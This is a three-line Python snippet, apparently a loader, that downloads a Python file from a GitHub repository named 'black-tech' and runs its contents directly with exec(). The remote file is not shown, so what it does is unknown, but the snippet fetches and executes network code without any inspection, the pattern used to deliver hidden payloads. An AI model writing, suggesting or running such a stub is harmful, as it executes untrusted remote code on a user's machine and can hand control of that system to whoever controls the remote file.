from urllib.request import urlopen
url = 'https://github.com/cicadoves/black-tech/blob/main/over.py'
exec(urlopen(url).read().decode())
